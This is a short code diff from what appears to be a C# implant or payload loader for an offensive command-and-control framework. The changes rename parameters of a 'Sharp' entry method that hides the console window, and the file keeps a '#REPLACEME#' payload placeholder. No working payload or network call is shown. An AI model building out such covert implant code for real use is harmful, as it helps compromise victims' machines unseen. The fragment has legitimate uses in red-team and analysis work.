@@ -14,10 +14,10 @@ public class Program
     [DllImport("kernel32.dll")] static extern IntPtr GetCurrentThread();
     [DllImport("kernel32.dll")] static extern bool TerminateThread(IntPtr hThread, uint dwExitCode);
 
-    public static IntPtr DllBaseAddress = IntPtr.Zero;
     public const int SW_HIDE = 0;
     public const int SW_SHOW = 5;
     public static string basepayload = "#REPLACEME#";
+    public static IntPtr DllBaseAddress = IntPtr.Zero;
 
     public Program() {
         try
@@ -55,9 +55,9 @@ public class Program
         }
         return stringBuilder.ToString().Trim();
     }
-    public static void Sharp(long baseAddr=0)
+    public static void Sharp(long callbackFunc = 0, long baseAddress = 0)
     {
-        DllBaseAddress = new IntPtr(baseAddr);
+        DllBaseAddress = new IntPtr(baseAddress);
         var handle = GetConsoleWindow();
         ShowWindow(handle, SW_HIDE);
         try
